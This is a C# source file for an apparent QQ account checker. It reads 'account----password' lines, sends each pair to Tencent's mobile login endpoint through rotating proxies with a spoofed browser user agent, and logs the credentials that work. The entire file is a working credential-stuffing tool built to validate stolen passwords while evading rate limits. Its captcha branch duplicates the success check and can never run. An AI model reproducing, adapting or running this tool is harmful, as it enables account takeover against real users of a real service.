using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using Ws.Hoyland.Util;
using System.IO;
using System.Text.RegularExpressions;
using System.Net;
using System.Configuration;
using System.Windows.Forms;
using Ws.Hoyland.CSharp.XThread;

namespace SM2014
{
    public class Task : Runnable
    {
        private Form1 form;
        private String line;
        //private HttpClient client = null;

        private static String UAG = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 734; Maxthon; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)";
        private static Configuration cfa = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);

        public Task(Form1 form, String line)
        {
            this.form = form;
            this.line = line;
            //cfa = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);

            //if (cfa == null)
            //{
            //    MessageBox.Show("加载配置文件失败!");
            //}
        }

        public void Abort()
        {
            //
        }

        public void Run()
        {
            //long start = DateTime.Now.Ticks;

            String[] details = Regex.Split(line, "----");
            String url = "http://pt.3g.qq.com/login?act=json&format=2&bid_code=house_touch&r=#" + "&qq=" + details[1] + "&pmd5=" + Util.UMD5X(details[2]) + "&go_url=http%3A%2F%2Fhouse60.3g.qq.com%2Ftouch%2Findex.jsp%3Fsid%3DAd_JZ1k2ZviFLkV2nvFt7005%26g_ut%3D3%26g_f%3D15124";
            
            form.Info("开始查询帐号:" + details[1]);

            WebProxy wp = null;
            Stream stream = null;
            StreamReader reader = null;
            String resp = null;

            bool flag = true;
            int times = 0;

            //http请求
            HttpClient client = new HttpClient();

            int ts = Int32.Parse(cfa.AppSettings.Settings["TASK_TIMES"].Value);
            while (flag && times < ts)
            {
                //Console.WriteLine("DDDDDDDDD");
                ConfigurationManager.RefreshSection("appSettings");

                resp = null;
                client.Headers.Add("User-Agent", Task.UAG);
                String proxy = form.GetProxy();
                if (proxy == null)
                {
                    flag = false;
                    continue;
                }

                form.Info(details[1] + " -> " + proxy);
                wp = new WebProxy(proxy);
                client.Proxy = wp;
                client.Encoding = Encoding.Default;

                try
                {
                    url = url.Replace("#", Form1.RANDOM.NextDouble().ToString());

                    stream = client.OpenRead(url);
                    reader = new StreamReader(stream);
                    resp = reader.ReadToEnd();

                    if (resp.IndexOf("pt.handleLoginResult") == -1)//代理异常
                    {
                        form.RemoveProxy(proxy);
                    }
                    else
                    {
                        //bool ok = false;
                        if (resp.IndexOf("," + details[1] + ",0,") != -1)
                        {
                            form.Log(0, details[1] + "----" + details[2]);//details[1] + " / " + proxy
                            flag = false;
                        }
                        else if (resp.IndexOf(",0,40010,") != -1)
                        {
                            form.Log(1, details[1] + "----" + details[2]);
                            flag = false;
                        }
                        else if (resp.IndexOf(",0,40026,") != -1)
                        {
                            form.Log(2, details[1] + "----" + details[2]);
                            flag = false;
                        }
                        else if (resp.IndexOf("," + details[1] + ",0,") != -1)//验证码
                        {
                            form.Queue(this.line);
                            //不离开当前任务
                            //Thread.Sleep(1000 * Int32.Parse(cfa.AppSettings.Settings["P_ITV"].Value));//N秒后继续
                        }
                        else //代理异常
                        {
                            form.RemoveProxy(proxy);
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    //代理异常
                    form.RemoveProxy(proxy);
                }

                if (reader != null)
                {
                    reader.Close();
                }
                if (stream != null)
                {
                    stream.Close();
                }

                times++;
            }

            //Console.WriteLine(Thread.CurrentThread.GetHashCode() + ">>>>:" + (DateTime.Now.Ticks - start));
            //client.Dispose();

            form.Finish();

            //Thread.CurrentThread.Abort();
        }
    }
}
